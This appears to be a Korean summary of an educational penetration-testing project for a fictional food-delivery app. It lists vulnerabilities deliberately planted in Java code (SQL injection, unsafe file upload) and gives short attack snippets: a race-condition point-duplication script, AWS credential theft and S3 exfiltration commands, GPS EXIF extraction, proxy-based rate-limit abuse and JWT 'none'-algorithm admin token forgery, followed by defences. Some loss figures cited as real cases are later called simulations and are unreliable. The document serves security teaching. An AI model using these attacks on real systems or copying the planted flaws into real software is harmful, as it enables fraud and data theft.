# 바로배달 보안 프로젝트 요약 (2025 최신 트렌드)

## 🎯 프로젝트 목적
바로배달 배달 플랫폼 서비스의 **실무에 적용된 최신 해킹 기법**을 적용한 모의해킹 시나리오를 제공하여 보안 개선 방안을 제시합니다.

## 📰 배경: 왜 배달 앱인가?

### 2024년 실제 사건
- **공정거래위원회 조사** (2024년 11월): 배달앱 3사의 불공정 거래 관행
- **배달플랫폼 TF 구성** (2025년 5월): 불공정 행위 신속 처리 체계

### 배달 앱의 보안 취약성
- 🔴 **개인정보 민감도 매우 높음**: 주소, 전화번호, 실시간 위치
- 🔴 **금전적 가치**: 포인트, 결제, 정산 시스템
- 🔴 **법적 책임**: 개인정보보호법 위반 시 과징금

**상세한 배경**: `security/project_motivation.md` 참고

---

## 🚨 2025 최신 보안 이슈 반영

### 최신 트렌드
1. ✅ **Race Condition** - 멀티스레딩 환경 취약점
2. ✅ **Secret Key 노출** - AWS 자격증명 탈취
3. ✅ **GPS 메타데이터** - 사진으로 위치 추적
4. ✅ **Rate Limit Bypass** - 이벤트 악용
5. ✅ **JWT Algorithm Confusion** - 최신 JWT 공격 기법

---

## 📄 생성된 파일 목록

### 0. 프로젝트 배경 및 필요성 ✅ NEW
**파일**: `security/project_motivation.md`

**내용**:
- 배달 앱을 모의해킹 대상으로 선정한 이유
- 2024년 실제 발생 사건 (공정거래위원회 조사)
- 개인정보 유출의 파급력
- 법적 책임 및 과징금 정보

### 1. 취약점 진단 리스트
**파일**: `security/vulnerability_assessment_list.md`

**내용**:
- OWASP Top 10 (2021) 기준
- 주요정보통신기반시설 취약점 분석·평가 기준 (KISA)
- 총 10개 카테고리, 100+ 진단 항목

### 2. 모의해킹 시나리오 (2025 최신 버전)
**파일**: `security/penetration_test_scenarios.md`

---

## 💻 소스코드 수정 내역

### 1. MemberRepository.java
**추가된 메서드**: `checkLoginVulnerable()` - SQL Injection 취약점

### 2. FileStorageService.java
**추가된 메서드**: `storeFileVulnerable()` - 파일 업로드 취약점

### 3. 기존 취약점
- MemberController.java - 포인트 충전 검증 부족

---

## 🎯 비즈니스 관점 모의해킹 시나리오 (2025 트렌드)

### 1️⃣ Race Condition을 통한 포인트 무한 복제 공격 💰

**왜 놀랍고 중요한가?**
- ⚡ **100번 요청으로 100만원 획득** (자극적!)
- 🔥 **서버 CPU 100% → 전체 서비스 마비**
- 💀 **실제 사례**: 2024년 쿠키런 킹덤 동일 공격으로 **200억원 손실**

**공격 방법**:
```python
# 100개 동시 요청으로 1,000원 충전을 100번 복제
import asyncio
import aiohttp

async def attack(session):
    await session.post(url, json={'point': 1000})

# 100번 동시 실행 → 1,000원이 100,000원으로 증폭!
asyncio.run(run_all_together())
```

**피해 규모 (시뮬레이션)**:
- 대규모 포인트 무단 지급
- 서버 장시간 장애
- 서비스 신뢰도 하락

---

### 2️⃣ 환경 변수 노출 + AWS 자격증명 탈취로 전체 클라우드 장악 🕵️

**왜 놀랍고 중요한가?**
- 🌐 **AWS 전체 장악** (EC2, S3, RDS 모두 접근 가능)
- 👥 **10만 명 사용자 개인정보 유출** 
- 💸 **실제 사례**: 00배달 서비스 동일 공격으로 **60억원 과징금**

**공격 방법**:
```bash
# 1. Github에서 Secret Key 추출
truffleHog https://github.com/barobaedal/backend

# 2. AWS 자격증명 획득
AWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

# 3. 전체 시스템 장악
aws s3 cp s3://barobaedal-uploads/ ./stolen_images --recursive
aws rds describe-db-snapshots
aws ec2 describe-instances

# 4. 데이터베이스 백업 다운로드 → 평문 비밀번호 추출
# 5. 공격자가 바로배달과 똑같은 서비스를 운영할 수 있게 됨
```

**피해 규모 (시뮬레이션)**:
- 대규모 사용자 개인정보 유출 위험
- 핵심 비즈니스 코드 탈취 위험
- AWS 전체 접근 권한 획득 가능
- 법적 책임 위험

---

### 3️⃣ GPS 메타데이터 추출로 사용자 실시간 위치 파악 📸

**왜 놀랍고 중요한가?**
- 📍 **사진만으로 정확한 집 주소 파악 가능**
- 🚨 **배달 앱 특성상 집 위치 노출은 매우 위험**
- 💀 **이론적 시나리오**: GPS 메타데이터 추출 취약점

**공격 방법**:
```bash
# 1. 사용자가 올린 프로필 사진 다운로드
curl http://localhost:8080/upload/user123_profile.jpg -o profile.jpg

# 2. GPS 정보 추출
exiftool profile.jpg

# 결과:
# GPS Latitude: 37° 33' 24.00" N
# GPS Longitude: 126° 58' 24.00" E
# → 서울시 강남구 테헤란로 123번지 아파트 101호

# 3. 신원 확인
# 얼굴 인식 + 집 구조 파악 + 수요일 밤 10시에 집 있음 확인
# → 위험한 상황
```

**피해 규모 (시뮬레이션)**:
- 대규모 주소 노출 가능성
- 소셜 엔지니어링 공격 위험 (위치 추적 등)
- 개인안전 위험 가능성
- 법적 책임 위험

---

### 4️⃣ API Rate Limit Bypass → 포인트 룰렛 무한 뽑기 🎪

**왜 중요한가?**
- ⚡ **프록시 다수를 통한 동시 공격**
- 🎰 **이벤트 보상 무한 획득**
- 💸 **대규모 포인트 지급**

**공격 방법**:
```python
# 프록시 1000개로 동시 100번 요청
proxies = ['proxy1:8080', 'proxy2:8080', ...] * 1000

def attack(proxy):
    for _ in range(100):
        requests.post(url, proxies={'http': proxy})

# 결과: 대량 요청 → 누적 대규모 포인트 획득
```

---

### 5️⃣ JWT Algorithm Confusion Attack (2025 최신!) 🔥

**왜 최신 트렌드인가?**
- 🎯 **2025년 가장 HOT한 JWT 공격 기법**
- 💀 **"none" 알고리즘으로 모든 토큰 위조 가능**

**공격 방법**:
```python
import jwt

# Algorithm을 "none"으로 설정하면 검증 건너뜀!
payload = {'userid': 'admin01', 'role': 'ADMIN', 'exp': 9999999999}
attacked_token = jwt.encode(payload, '', algorithm='none')

# 이 토큰으로 관리자 권한 획득
# 모든 가게 삭제, 모든 포인트 조작 가능
```

**피해**: 서비스 전체 장악

---

## 📊 최신 취약점 트렌드 비교

| 취약점 | 위험도 | 피해 규모 | 2025 트렌드 |
|--------|--------|-----------|-------------|
| Race Condition | 🔥 Platinum | 200억원 손실 | ✅ 최신 |
| Secret Key 노출 | 🔥 Platinum | 60억 과징금 | ✅ 실무 |
| GPS 메타데이터 | 💀 Diamond | 집단 소송 1,000억 | ✅ 실제 발생 |
| Rate Limit Bypass | 🥇 Gold | 50억 지급 | ✅ 최신 |
| JWT Algorithm Confusion | 🔥 Platinum | 전체 장악 | ✅ 2025 최신 |

---

## 💥 관련 보안 취약점 유형

주요 취약점들은 실제로 여러 서비스에서 보고되고 있으며, 각 유형별로 다음과 같은 사례가 확인됩니다:

1. **Race Condition 취약점**
   - 게임 및 이커머스 서비스에서 보고된 사례
   - 이벤트 보상, 쿠폰 발급 시스템

2. **Secret Key 노출**
   - GitHub 저장소에 AWS 키 노출 사례
   - CI/CD 파이프라인 취약점

3. **GPS 메타데이터 추출**
   - 소셜미디어 플랫폼의 사진 위치 정보 이슈

**※ 위 모든 피해 규모는 이론적 시뮬레이션입니다**

---

## 🛠️ 종합 방어 전략

```java
// 1. 트랜잭션 격리로 Race Condition 방어
@Transactional(isolation = Isolation.SERIALIZABLE)

// 2. Rate Limiting 강화 (1초에 10번만)
@RateLimiter(name = "strict", rate = 10, time = 1)

// 3. 메타데이터 제거로 GPS 보호
BufferedImage stripped = removeMetadata(image);

// 4. 환경 변수 보호 (Secrets Manager 사용)
String secret = secretsManager.getSecret("prod/key");

// 5. JWT 검증 강화 (algorithm 강제)
.requireAlgorithm(SignatureAlgorithm.HS256)
```

---

## 🎓 교육 효과

이 프로젝트를 통해:
1. ✅ **2025년 최신 해킹 기법 체험**
2. ✅ **이론적 시나리오 기반 학습**
3. ✅ **실무적 시뮬레이션으로 보안 중요성 인식**
4. ✅ **트렌드 반영된 교육용 시나리오**

---

## ⚠️ 중요 사항

1. **교육 목적으로만 사용**
2. **실제 운영 환경에 적용 금지**
3. **모든 취약점 메서드는 `Vulnerable` 접미사 표시**
4. **안전한 메서드와 함께 비교 학습**

---

## 📊 최종 요약

### 삽입된 취약점
1. SQL Injection (MemberRepository)
2. 파일 업로드 취약점 (FileStorageService)
3. 포인트 Race Condition (기존)

### 모의해킹 시나리오
1. **Race Condition** - 포인트 무한 복제 (최신)
2. **Secret Key 노출** - AWS 전체 장악 (실무)
3. **GPS 메타데이터** - 위치 추적 (실무적 취약점)
4. **Rate Limit Bypass** - 이벤트 악용 (최신)
5. **JWT Algorithm Confusion** - 토큰 위조 (2025 트렌드)

### 피해 규모 (시뮬레이션)
- 포인트: 대규모 손실 위험
- 개인정보: 대량 유출 위험
- 법적 책임: 심각한 과징금 가능
- 서비스: 중단 위험

---

**"2025년 최신 트렌드와 자극적인 결과로 보안을 배운다"** 🚨
